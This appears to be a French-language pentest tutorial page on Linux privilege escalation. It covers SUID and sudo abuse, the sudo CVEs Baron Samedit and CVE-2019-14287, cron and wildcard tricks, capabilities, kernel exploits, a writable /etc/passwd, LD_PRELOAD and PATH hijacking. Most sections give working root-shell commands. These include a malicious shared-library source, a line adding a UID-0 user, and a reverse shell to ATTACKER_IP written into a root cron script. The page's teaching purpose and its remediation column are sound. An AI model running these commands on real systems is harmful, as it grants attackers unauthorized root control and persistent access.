---
title: Escalade de privilèges
description: Techniques d'escalade de privilèges Linux — SUID, sudo, cron jobs, capabilities, kernel exploits et outils d'énumération automatisée.
category: hacking
slug: privesc
order: 8
---

## Escalade de privilèges {#intro}

L'**escalade de privilèges** (privilege escalation) consiste à obtenir un niveau d'accès supérieur à celui initialement accordé. C'est une étape cruciale après avoir obtenu un premier accès à un système.

| Type            | Description                                   | Exemple                                      |
| --------------- | --------------------------------------------- | -------------------------------------------- |
| **Verticale**   | Passer d'un utilisateur standard à root/admin | `www-data` → `root`                          |
| **Horizontale** | Accéder au compte d'un autre utilisateur      | `user1` → `user2` (même niveau de privilège) |

```
   Escalade verticale :                 Escalade horizontale :
   ─────────────────────                ──────────────────────

    ┌──────────┐                         ┌──────────┐       ┌──────────┐
    │   root   │   ←  objectif           │  user1   │  ──>  │  user2   │
    └──────────┘                         └──────────┘       └──────────┘
          ▲                                 (même niveau de privilège)
   ┌──────┴─────┐
   │  www-data  │  ←  accès initial
   └────────────┘
```

## SUID / SGID {#suid}

Les binaires avec le bit **SUID** (Set User ID) s'exécutent avec les privilèges du propriétaire du fichier (souvent root), quel que soit l'utilisateur qui les lance.

### Trouver les binaires SUID

```bash
# Find all SUID binaries on the system
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null
```

### Exploitation avec GTFOBins

[GTFOBins](https://gtfobins.github.io/) est une base de données de binaires Unix qui peuvent être exploités pour contourner les restrictions de sécurité.

```bash
# Example: /usr/bin/find has SUID bit set
# Spawn a root shell via find
find . -exec /bin/sh -p \; -quit

# Example: /usr/bin/python3 has SUID bit set
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Example: /usr/bin/vim has SUID bit set
vim -c ':!/bin/sh'

# Example: /usr/bin/nmap (old versions with interactive mode)
nmap --interactive
!sh
```

### SUID courants exploitables

| Binaire  | Commande d'exploitation                                     |
| -------- | ----------------------------------------------------------- |
| `bash`   | `bash -p`                                                   |
| `find`   | `find . -exec /bin/sh -p \; -quit`                          |
| `python` | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `vim`    | `vim -c ':!/bin/sh'`                                        |
| `cp`     | Écraser `/etc/passwd` ou `/etc/shadow`                      |
| `wget`   | Télécharger et remplacer des fichiers système               |

## Sudo {#sudo}

### Vérifier les permissions sudo

```bash
# List sudo permissions for the current user
sudo -l
```

Exemple de sortie :

```
User www-data may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/find
    (ALL, !root) /bin/bash
```

### Exploitation

```bash
# If vim is allowed via sudo
sudo vim -c ':!/bin/sh'

# If find is allowed via sudo
sudo find / -exec /bin/sh \; -quit

# If python3 is allowed via sudo
sudo python3 -c 'import os; os.system("/bin/sh")'

# If env is allowed via sudo (LD_PRELOAD attack)
# See LD_PRELOAD section below

# If tar is allowed via sudo
sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### Exploits de versions sudo

```bash
# Check sudo version
sudo --version

# CVE-2021-3156 (Baron Samedit) - sudo < 1.9.5p2
# Heap buffer overflow allowing any user to get root
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# CVE-2019-14287 - sudo < 1.8.28
# Bypass (ALL, !root) restriction with UID -1
sudo -u#-1 /bin/bash
```

## Cron jobs {#cron}

Les **tâches cron** s'exécutent périodiquement avec les privilèges de leur propriétaire. Si un script exécuté par root est modifiable par un utilisateur standard, c'est une escalade de privilèges directe.

```bash
# List system cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# List user cron jobs
crontab -l

# Monitor running processes to discover cron jobs (with pspy)
./pspy64
```

### Exploitation

```bash
# If a cron job runs /opt/scripts/backup.sh as root
# and the script is writable by your user:
echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh

# PATH manipulation: if a cron job calls a command without full path
# Create a malicious script with the same name in a directory
# that appears earlier in PATH
echo '#!/bin/bash' > /tmp/tar
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/tar
chmod +x /tmp/tar
# Wait for cron to execute, then:
/tmp/rootbash -p
```

### Wildcards

Certains cron jobs utilisent des wildcards (`*`) qui peuvent être exploités :

```bash
# If a cron job runs: tar czf /backup/archive.tar.gz *
# Create files whose names are interpreted as tar options
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
```

## Capabilities {#capabilities}

Les **capabilities** Linux permettent de donner des privilèges spécifiques à un binaire sans le rendre SUID root.

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null
```

### Capabilities exploitables

| Capability         | Exploitation                                      |
| ------------------ | ------------------------------------------------- |
| `cap_setuid`       | Changer l'UID du processus → devenir root         |
| `cap_setgid`       | Changer le GID du processus                       |
| `cap_dac_override` | Ignorer les permissions de fichiers (lire/écrire) |
| `cap_net_raw`      | Capturer des paquets réseau (sniffing)            |
| `cap_sys_admin`    | Monter des systèmes de fichiers, etc.             |

```bash
# Example: python3 with cap_setuid
# getcap shows: /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Kernel exploits {#kernel}

Les exploits noyau ciblent des vulnérabilités dans le kernel Linux pour obtenir un accès root.

```bash
# Check kernel version
uname -a
uname -r
cat /etc/os-release

# Search for known exploits
searchsploit linux kernel <version> privilege escalation

# Popular kernel exploits:
# - Dirty COW (CVE-2016-5195) — Linux < 4.8.3
# - Dirty Pipe (CVE-2022-0847) — Linux 5.8 - 5.16.11
# - PwnKit (CVE-2021-4034) — pkexec (polkit)
# - GameOver(lay) (CVE-2023-2640) — Ubuntu OverlayFS
```

> **Attention** : Les exploits noyau peuvent crasher le système. À utiliser en dernier recours et avec précaution lors d'un pentest.

## /etc/passwd modifiable {#passwd}

Si `/etc/passwd` est modifiable (permissions incorrectes), on peut ajouter un utilisateur root :

```bash
# Check permissions
ls -la /etc/passwd

# If writable, generate a password hash
openssl passwd -1 -salt xyz password123

# Add a new root user (UID 0, GID 0)
echo 'hacker:$1$xyz$tGGvE5rLgFVPQ0JMKIuEQ0:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to the new user
su hacker
# Password: password123
```

## Variables d'environnement {#env}

### LD_PRELOAD {#ldpreload}

Si `sudo` est configuré avec `env_keep+=LD_PRELOAD`, on peut charger une bibliothèque malveillante :

```c
// shell.c - Shared library that spawns a root shell
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

```bash
# Compile the shared library
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c

# Run any allowed sudo command with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find
```

### PATH hijacking {#path}

Si un programme SUID ou un script exécuté par root appelle une commande sans chemin absolu :

```bash
# If a SUID binary calls "service" without full path:
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
# Run the SUID binary — it will execute /tmp/service instead of /usr/sbin/service
```

## Outils d'énumération {#enumtools}

### LinPEAS {#linpeas}

**LinPEAS** est le script d'énumération le plus complet. Il vérifie automatiquement des centaines de vecteurs d'escalade.

```bash
# Download LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Run it on the target
chmod +x linpeas.sh
./linpeas.sh

# Redirect output for analysis
./linpeas.sh | tee linpeas_output.txt
```

### LinEnum {#linenum}

```bash
# Download and run LinEnum
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o linenum.sh
chmod +x linenum.sh
./linenum.sh -t
```

## Checklist d'énumération {#checklist}

| Vecteur            | Comment vérifier                      | Comment exploiter           | Comment corriger                      |
| ------------------ | ------------------------------------- | --------------------------- | ------------------------------------- |
| SUID/SGID          | `find / -perm -4000`                  | GTFOBins                    | Retirer les bits SUID inutiles        |
| Sudo               | `sudo -l`                             | GTFOBins, exploits sudo     | Restreindre les permissions           |
| Cron jobs          | `/etc/crontab`, `pspy`                | Modifier les scripts, PATH  | Permissions strictes, chemins absolus |
| Capabilities       | `getcap -r /`                         | GTFOBins                    | Retirer les capabilities inutiles     |
| Kernel             | `uname -a`                            | searchsploit                | Mettre à jour le kernel               |
| /etc/passwd        | `ls -la /etc/passwd`                  | Ajouter un utilisateur root | Permissions 644                       |
| Fichiers sensibles | `find / -writable`                    | Écraser des configs         | Permissions correctes                 |
| Variables d'env.   | `sudo -l` (env_keep)                  | LD_PRELOAD, PATH hijacking  | Ne pas préserver LD_PRELOAD           |
| Mots de passe      | `cat /etc/shadow`, fichiers de config | Cracker les hashes          | Mots de passe forts, bcrypt           |

## Pour aller plus loin {#next}

- [Hash cracking](/help/hacking/hashing) — casser les hashes récupérés avec Hashcat et John
- [Attaques réseau](/help/hacking/network) — pivotement et mouvement latéral
- [Boîte à outils](/help/hacking/tools) — LinPEAS, pspy, Chisel et autres outils post-exploitation